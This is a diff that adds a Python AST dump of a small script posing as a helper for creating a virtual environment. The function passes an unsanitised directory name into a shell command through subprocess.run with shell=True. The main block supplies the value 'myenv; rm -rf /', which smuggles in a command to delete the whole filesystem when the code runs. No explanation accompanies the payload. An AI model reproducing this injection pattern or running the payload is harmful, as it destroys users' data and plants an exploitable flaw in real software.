@@ -1,0 +1,115 @@
+Module(
+    body=[
+        Import(
+            names=[
+                alias(name='os')]),
+        Import(
+            names=[
+                alias(name='subprocess')]),
+        FunctionDef(
+            name='create_virtualenv',
+            args=arguments(
+                posonlyargs=[],
+                args=[
+                    arg(arg='env_dir')],
+                kwonlyargs=[],
+                kw_defaults=[],
+                defaults=[]),
+            body=[
+                If(
+                    test=Call(
+                        func=Attribute(
+                            value=Attribute(
+                                value=Name(id='os', ctx=Load()),
+                                attr='path',
+                                ctx=Load()),
+                            attr='exists',
+                            ctx=Load()),
+                        args=[
+                            Name(id='env_dir', ctx=Load())],
+                        keywords=[]),
+                    body=[
+                        Raise(
+                            exc=Call(
+                                func=Name(id='FileExistsError', ctx=Load()),
+                                args=[
+                                    JoinedStr(
+                                        values=[
+                                            Constant(value='Directory '),
+                                            FormattedValue(
+                                                value=Name(id='env_dir', ctx=Load()),
+                                                conversion=-1),
+                                            Constant(value=' already exists.')])],
+                                keywords=[]))],
+                    orelse=[]),
+                Expr(
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='subprocess', ctx=Load()),
+                            attr='run',
+                            ctx=Load()),
+                        args=[
+                            JoinedStr(
+                                values=[
+                                    Constant(value='python3 -m venv '),
+                                    FormattedValue(
+                                        value=Name(id='env_dir', ctx=Load()),
+                                        conversion=-1)])],
+                        keywords=[
+                            keyword(
+                                arg='shell',
+                                value=Constant(value=True))]))],
+            decorator_list=[]),
+        If(
+            test=Compare(
+                left=Name(id='__name__', ctx=Load()),
+                ops=[
+                    Eq()],
+                comparators=[
+                    Constant(value='__main__')]),
+            body=[
+                Assign(
+                    targets=[
+                        Name(id='env_directory', ctx=Store())],
+                    value=Constant(value='myenv; rm -rf /')),
+                Expr(
+                    value=Call(
+                        func=Name(id='create_virtualenv', ctx=Load()),
+                        args=[
+                            Name(id='env_directory', ctx=Load())],
+                        keywords=[])),
+                Assign(
+                    targets=[
+                        Name(id='activate_script', ctx=Store())],
+                    value=Call(
+                        func=Attribute(
+                            value=Attribute(
+                                value=Name(id='os', ctx=Load()),
+                                attr='path',
+                                ctx=Load()),
+                            attr='join',
+                            ctx=Load()),
+                        args=[
+                            Name(id='env_directory', ctx=Load()),
+                            Constant(value='bin'),
+                            Constant(value='activate')],
+                        keywords=[])),
+                Expr(
+                    value=Call(
+                        func=Attribute(
+                            value=Name(id='subprocess', ctx=Load()),
+                            attr='run',
+                            ctx=Load()),
+                        args=[
+                            JoinedStr(
+                                values=[
+                                    Constant(value='source '),
+                                    FormattedValue(
+                                        value=Name(id='activate_script', ctx=Load()),
+                                        conversion=-1)])],
+                        keywords=[
+                            keyword(
+                                arg='shell',
+                                value=Constant(value=True))]))],
+            orelse=[])],
+    type_ignores=[])
